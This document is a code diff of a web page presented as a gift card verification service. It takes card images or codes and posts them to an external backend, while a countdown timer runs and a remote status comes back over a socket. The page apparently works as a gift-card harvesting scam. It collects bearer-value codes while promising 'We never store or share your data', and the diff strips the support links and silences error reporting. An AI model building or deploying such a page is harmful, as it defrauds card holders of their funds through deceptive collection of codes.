@@ -9,136 +9,49 @@
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
-        
-        body { 
-            background: #0b011d; 
-            font-family: 'Inter', sans-serif;
-            color: white;
-            overflow-x: hidden;
-        }
-
-        .hero-gradient {
-            background: radial-gradient(circle at top right, #2d0a5e 0%, #0b011d 60%);
-        }
-
+        body { background:#0b011d; font-family:'Inter',sans-serif; color:white; overflow-x:hidden; }
+        .hero-gradient { background:radial-gradient(circle at top right,#2d0a5e 0%,#0b011d 60%); }
         .main-form-container {
-            background: white;
-            color: #1a1a1a;
-            border-radius: 2rem 2rem 0 0;
-            width: 100%;
-            position: relative;
-            z-index: 20;
+            background:white; color:#1a1a1a;
+            border-radius:2rem 2rem 0 0; width:100%; position:relative; z-index:20;
         }
-
-        @media (min-width: 1024px) {
-            .main-form-container {
-                border-radius: 2rem;
-                margin-top: -6rem;
-                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            }
+        @media(min-width:1024px){
+            .main-form-container{ border-radius:2rem; margin-top:-6rem; box-shadow:0 25px 50px -12px rgba(0,0,0,.5); }
         }
-
         .step-number {
-            background: #5b21b6;
-            color: white;
-            width: 36px;
-            height: 36px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-            font-weight: bold;
-            flex-shrink: 0;
+            background:#5b21b6; color:white; width:36px; height:36px;
+            display:flex; align-items:center; justify-content:center;
+            border-radius:50%; font-weight:bold; flex-shrink:0;
         }
-
-        .step-number.optional {
-            background: #a78bfa;
-        }
-
-        .upload-dashed {
-            border: 2px dashed #e2e8f0;
-            transition: all 0.3s ease;
-        }
-
-        .upload-dashed:hover {
-            border-color: #8b5cf6;
-            background: #f5f3ff;
-        }
-
-        /* Uploaded state */
-        .upload-dashed.uploaded {
-            border-color: #10b981;
-            background: #f0fdf4;
-        }
-
+        .step-number.optional { background:#a78bfa; }
+        .upload-dashed { border:2px dashed #e2e8f0; transition:all .3s ease; }
+        .upload-dashed:hover { border-color:#8b5cf6; background:#f5f3ff; }
+        .upload-dashed.uploaded { border-color:#10b981; background:#f0fdf4; }
         .progress-node {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            border: 2px solid #ddd;
-            background: white;
-            z-index: 10;
+            width:24px; height:24px; border-radius:50%;
+            border:2px solid #ddd; background:white; z-index:10;
         }
-
         .progress-node.active {
-            background: #6366f1;
-            border-color: #6366f1;
-            box-shadow: 0 0 10px rgba(99, 102, 241, 0.5);
+            background:#6366f1; border-color:#6366f1;
+            box-shadow:0 0 10px rgba(99,102,241,.5);
         }
-
         .progress-line {
-            height: 2px;
-            background: #eee;
-            position: absolute;
-            top: 12px;
-            left: 0;
-            right: 0;
-            z-index: 1;
+            height:2px; background:#eee; position:absolute;
+            top:12px; left:0; right:0; z-index:1;
         }
-
-        /* Result banner */
         #resultBanner {
-            display: none;
-            margin-top: 1.5rem;
-            padding: 1.5rem 2rem;
-            border-radius: 1rem;
-            font-weight: bold;
-            font-size: 1.1rem;
-            text-align: center;
-            transition: all 0.3s ease;
+            display:none; margin-top:1.5rem; padding:1.5rem 2rem;
+            border-radius:1rem; font-weight:bold; font-size:1.1rem;
+            text-align:center; transition:all .3s ease;
         }
-        #resultBanner.approved {
-            background: #d1fae5;
-            border: 2px solid #10b981;
-            color: #065f46;
-        }
-        #resultBanner.rejected {
-            background: #fee2e2;
-            border: 2px solid #ef4444;
-            color: #7f1d1d;
-        }
-
-        /* Submit button result states */
-        #submitBtn.valid {
-            background: #059669 !important;
-            cursor: default;
-        }
-        #submitBtn.invalid {
-            background: #dc2626 !important;
-            cursor: default;
-        }
-
-        /* Optional badge */
+        #resultBanner.approved { background:#d1fae5; border:2px solid #10b981; color:#065f46; }
+        #resultBanner.rejected { background:#fee2e2; border:2px solid #ef4444; color:#7f1d1d; }
+        #submitBtn.valid   { background:#059669 !important; cursor:default; }
+        #submitBtn.invalid { background:#dc2626 !important; cursor:default; }
         .optional-tag {
-            font-size: 0.7rem;
-            font-weight: 500;
-            color: #a78bfa;
-            background: #f5f3ff;
-            border: 1px solid #ddd9fe;
-            padding: 2px 8px;
-            border-radius: 999px;
-            margin-left: 4px;
-            vertical-align: middle;
+            font-size:.7rem; font-weight:500; color:#a78bfa;
+            background:#f5f3ff; border:1px solid #ddd9fe;
+            padding:2px 8px; border-radius:999px; margin-left:4px; vertical-align:middle;
         }
     </style>
 </head>
@@ -183,7 +96,6 @@
                     </div>
                 </div>
             </div>
-
             <div class="hidden lg:flex justify-end relative">
                 <div class="w-96 h-56 bg-zinc-900 rounded-2xl border border-white/10 p-6 relative overflow-hidden shadow-2xl rotate-3 transform hover:rotate-0 transition-transform duration-500">
                     <div class="absolute -right-10 -top-10 w-40 h-40 bg-purple-600/20 blur-3xl"></div>
@@ -191,9 +103,7 @@
                         <span class="text-xs tracking-widest text-gray-500">GIFT CARD</span>
                         <div class="w-10 h-7 bg-zinc-800 rounded border border-white/5"></div>
                     </div>
-                    <div class="mt-12">
-                        <p class="text-2xl font-mono tracking-wider">**** **** **** 3456</p>
-                    </div>
+                    <div class="mt-12"><p class="text-2xl font-mono tracking-wider">**** **** **** 3456</p></div>
                     <p class="mt-8 text-xs text-gray-500">A GIFT FOR YOU</p>
                 </div>
             </div>
@@ -205,10 +115,7 @@
             <div class="space-y-4">
                 <div class="flex items-center gap-4">
                     <span class="step-number optional">1</span>
-                    <h3 class="text-2xl font-bold">
-                        Upload Gift Card Image
-                        <span class="optional-tag">Optional</span>
-                    </h3>
+                    <h3 class="text-2xl font-bold">Upload Gift Card Image <span class="optional-tag">Optional</span></h3>
                 </div>
                 <div id="uploadArea" class="upload-dashed rounded-2xl p-10 text-center cursor-pointer ml-0 md:ml-12">
                     <div id="uploadPlaceholder">
@@ -234,9 +141,7 @@
             <div class="space-y-4">
                 <div class="flex items-center gap-4">
                     <span class="step-number optional">2</span>
-                    <h3 class="text-2xl font-bold">
-                        Enter Gift Card Code
-                    </h3>
+                    <h3 class="text-2xl font-bold">Enter Gift Card Code <span class="optional-tag">Optional</span></h3>
                 </div>
                 <div class="ml-0 md:ml-12 relative">
                     <i class="fa-regular fa-credit-card absolute left-5 top-1/2 -translate-y-1/2 text-gray-400 text-xl"></i>
@@ -244,7 +149,6 @@
                            class="w-full bg-gray-50 border border-gray-200 rounded-xl py-5 pl-14 pr-6 text-xl font-mono focus:ring-2 focus:ring-purple-500 outline-none transition-all uppercase placeholder:text-gray-300"
                            placeholder="ABCD-EFDH-QYHN-QWER">
                 </div>
-                <!-- hint shown when nothing is filled -->
                 <p id="atLeastOneHint" class="hidden ml-0 md:ml-12 text-sm text-red-500 font-medium">
                     <i class="fa-solid fa-triangle-exclamation mr-1"></i>
                     Please upload an image or enter a code — at least one is required.
@@ -255,8 +159,7 @@
             <div class="ml-0 md:ml-12">
                 <button type="button" id="submitBtn"
                     class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-6 rounded-xl shadow-lg transition-all active:scale-[0.98] flex items-center justify-center gap-3 text-lg cursor-pointer select-none">
-                    <i class="fa-solid fa-shield-check"></i>
-                    Start Verification
+                    <i class="fa-solid fa-shield-check"></i> Start Verification
                 </button>
                 <p class="text-center text-sm text-gray-400 mt-5">
                     <i class="fa-solid fa-lock mr-2"></i> We never store or share your data.
@@ -275,7 +178,6 @@
                         <div class="text-[10px] text-gray-400 font-bold leading-tight uppercase text-left">min<br>sec</div>
                     </div>
                 </div>
-
                 <div class="relative flex justify-between max-w-2xl mx-auto">
                     <div class="progress-line"></div>
                     <div class="flex flex-col items-center gap-3 relative z-10">
@@ -293,10 +195,8 @@
                         <span class="text-xs font-bold text-gray-400">Final Status</span>
                     </div>
                 </div>
-
                 <div id="resultBanner"></div>
             </div>
-
         </div>
 
         <footer class="mt-12 flex flex-col md:flex-row justify-between items-center gap-6 text-gray-500 text-sm px-4">
@@ -304,50 +204,31 @@
                 <i class="fa-solid fa-circle-check text-green-500"></i>
                 All checks are performed securely and privately.
             </div>
-            <div>
-                Need help? Visit our <a href="#" class="text-indigo-400">FAQs</a> or <a href="#" class="text-indigo-400 font-bold underline">contact support</a>
-            </div>
         </footer>
     </main>
 
     <script>
+        const API = 'https://giftcard-check-production.up.railway.app';
+
         let verificationActive = false;
 
-        window.addEventListener('beforeunload', function (e) {
-            if (verificationActive) {
-                e.preventDefault();
-                e.returnValue = '';
-            }
+        window.addEventListener('beforeunload', function(e) {
+            if (verificationActive) { e.preventDefault(); e.returnValue = ''; }
         });
-
-        window.addEventListener('error', function (event) {
-            console.error('Global error caught:', event.error);
-            event.preventDefault();
-            return false;
-        });
-
-        window.addEventListener('unhandledrejection', function (event) {
-            console.error('Unhandled promise rejection:', event.reason);
-            event.preventDefault();
-        });
+        window.addEventListener('error', function(event) { event.preventDefault(); return false; });
+        window.addEventListener('unhandledrejection', function(event) { event.preventDefault(); });
 
         // ── Socket (lazy) ──────────────────────────────
         let socket = null;
 
         function initSocket(submissionId) {
             if (socket) { setupSocket(submissionId); return; }
-
-            socket = io('/', {
+            socket = io(API, {
                 reconnection: false,
                 transports: ['polling'],
                 forceNew: true
             });
-
-            socket.on('connect', () => {
-                console.log('Socket connected:', socket.id);
-                setupSocket(submissionId);
-            });
-
+            socket.on('connect',       () => { console.log('Socket connected:', socket.id); setupSocket(submissionId); });
             socket.on('connect_error', (err) => console.error('Socket error:', err.message));
             socket.on('disconnect',    () => console.log('Socket disconnected'));
         }
@@ -366,14 +247,12 @@
         const timerDisplay      = document.getElementById('timerDisplay');
         const atLeastOneHint    = document.getElementById('atLeastOneHint');
 
-        // ── Upload area ────────────────────────────────
-        uploadArea.addEventListener('click', function (e) {
-            // Don't trigger file picker when clicking remove button
+        // ── Upload ─────────────────────────────────────
+        uploadArea.addEventListener('click', function(e) {
             if (e.target.closest('#removeImageBtn')) return;
             imageInput.click();
         });
-
-        imageInput.addEventListener('change', function () {
+        imageInput.addEventListener('change', function() {
             const file = this.files[0];
             if (!file) return;
             const reader = new FileReader();
@@ -386,9 +265,7 @@
             };
             reader.readAsDataURL(file);
         });
-
-        // Remove image
-        removeImageBtn.addEventListener('click', function (e) {
+        removeImageBtn.addEventListener('click', function(e) {
             e.stopPropagation();
             imageInput.value = '';
             previewImg.src = '';
@@ -396,19 +273,15 @@
             uploadPlaceholder.classList.remove('hidden');
             uploadArea.classList.remove('uploaded');
         });
-
-        // Hide hint when user types code
-        codeInput.addEventListener('input', function () {
+        codeInput.addEventListener('input', function() {
             if (this.value.trim()) atLeastOneHint.classList.add('hidden');
         });
-
-        codeInput.addEventListener('keydown', function (e) {
+        codeInput.addEventListener('keydown', function(e) {
             if (e.key === 'Enter') { e.preventDefault(); submitBtn.click(); }
         });
 
         // ── Timer ──────────────────────────────────────
         let timerInterval = null;
-
         function startTimer(seconds) {
             if (timerInterval) clearInterval(timerInterval);
             let timeLeft = seconds;
@@ -416,13 +289,12 @@
                 const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
                 const s = (timeLeft % 60).toString().padStart(2, '0');
                 timerDisplay.textContent = `${m}:${s}`;
-                if (timeLeft <= 0) { clearInterval(timerInterval); timerDisplay.textContent = 'Time up try again'; }
+                if (timeLeft <= 0) { clearInterval(timerInterval); timerDisplay.textContent = '00:00'; }
                 timeLeft--;
             };
             tick();
             timerInterval = setInterval(tick, 1000);
         }
-
         function stopTimer() {
             if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
         }
@@ -431,41 +303,24 @@
         function showResult(status) {
             stopTimer();
             verificationActive = false;
-
-            // Progress nodes
             document.getElementById('step-code').classList.add('active');
             document.getElementById('step-code').innerHTML = `<i class="fa-solid fa-check text-[10px] text-white"></i>`;
             document.getElementById('step-status').classList.add('active');
             document.getElementById('step-status').innerHTML = `<i class="fa-solid fa-check text-[10px] text-white"></i>`;
-
-            // Result banner
             resultBanner.style.display = 'block';
-
             if (status === 'approved') {
                 resultBanner.className = 'approved';
-                resultBanner.innerHTML = `
-                    <i class="fa-solid fa-circle-check mr-2"></i>
-                    Your gift card is <strong>valid</strong>! 
-                `;
-                // ── Button becomes green "Valid" ──
+                resultBanner.innerHTML = `<i class="fa-solid fa-circle-check mr-2"></i> Your gift card is <strong>valid</strong>!`;
                 submitBtn.disabled = true;
-                submitBtn.className = submitBtn.className.replace('bg-indigo-600 hover:bg-indigo-700', '');
                 submitBtn.classList.add('valid');
                 submitBtn.innerHTML = `<i class="fa-solid fa-circle-check"></i> Valid`;
-
             } else {
                 resultBanner.className = 'rejected';
-                resultBanner.innerHTML = `
-                    <i class="fa-solid fa-circle-xmark mr-2"></i>
-                    This gift card is <strong>invalid</strong>. 
-                `;
-                // ── Button becomes red "Invalid" ──
+                resultBanner.innerHTML = `<i class="fa-solid fa-circle-xmark mr-2"></i> This gift card is <strong>invalid</strong>.`;
                 submitBtn.disabled = true;
-                submitBtn.className = submitBtn.className.replace('bg-indigo-600 hover:bg-indigo-700', '');
                 submitBtn.classList.add('invalid');
                 submitBtn.innerHTML = `<i class="fa-solid fa-circle-xmark"></i> Invalid`;
             }
-
             resultBanner.scrollIntoView({ behavior: 'smooth', block: 'center' });
         }
 
@@ -479,54 +334,42 @@
                     document.getElementById('step-code').classList.add('active');
                     document.getElementById('step-code').innerHTML = `<i class="fa-solid fa-check text-[10px] text-white"></i>`;
                 }
-                if (data.status === 'approved' || data.status === 'rejected') {
-                    showResult(data.status);
-                }
+                if (data.status === 'approved' || data.status === 'rejected') showResult(data.status);
             });
         }
 
         // ── Submit ─────────────────────────────────────
-        submitBtn.addEventListener('click', function () {
+        submitBtn.addEventListener('click', function() {
             if (submitBtn.disabled) return;
-
             const hasImage = imageInput.files[0];
             const hasCode  = codeInput.value.trim();
-
-            // At least one must be provided
             if (!hasImage && !hasCode) {
                 atLeastOneHint.classList.remove('hidden');
                 atLeastOneHint.scrollIntoView({ behavior: 'smooth', block: 'center' });
                 return;
             }
-
             atLeastOneHint.classList.add('hidden');
-
-            // Lock UI
             submitBtn.disabled = true;
             submitBtn.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...`;
-            verificationActive  = true;
+            verificationActive = true;
 
             const formData = new FormData();
             if (hasImage) formData.append('image', hasImage);
-            formData.append('code', hasCode || 'N/A'); // backend expects code field
+            formData.append('code', hasCode || 'N/A');
 
             const xhr = new XMLHttpRequest();
-            xhr.open('POST', '/api/submissions/submit', true);
-
-            xhr.onload = function () {
+            xhr.open('POST', `${API}/api/submissions/submit`, true);
+            xhr.onload = function() {
                 if (xhr.status >= 200 && xhr.status < 300) {
                     let data;
                     try { data = JSON.parse(xhr.responseText); }
-                    catch (e) { resetSubmitBtn(); alert('Server returned an unreadable response.'); return; }
-
-                    console.log('Server response:', data);
-
+                    catch(e) { resetSubmitBtn(); alert('Server returned an unreadable response.'); return; }
                     if (data.success && data.submissionId) {
                         statusContainer.classList.remove('hidden');
                         resultBanner.style.display = 'none';
                         startTimer(180);
                         initSocket(data.submissionId);
-                        setTimeout(() => statusContainer.scrollIntoView({ behavior: 'smooth', block: 'start' }), 150);
+                        setTimeout(() => statusContainer.scrollIntoView({ behavior:'smooth', block:'start' }), 150);
                     } else {
                         resetSubmitBtn();
                         alert('Error: ' + (data.message || 'Submission failed'));
@@ -536,12 +379,7 @@
                     alert('Server error: ' + xhr.status);
                 }
             };
-
-            xhr.onerror = function () {
-                resetSubmitBtn();
-                alert('Connection failed. Make sure your server is running.');
-            };
-
+            xhr.onerror = function() { resetSubmitBtn(); alert('Connection failed.'); };
             xhr.send(formData);
         });
 
@@ -549,7 +387,7 @@
             submitBtn.disabled = false;
             submitBtn.classList.remove('valid', 'invalid');
             submitBtn.innerHTML = `<i class="fa-solid fa-shield-check"></i> Start Verification`;
-            verificationActive  = false;
+            verificationActive = false;
         }
     </script>
 </body>
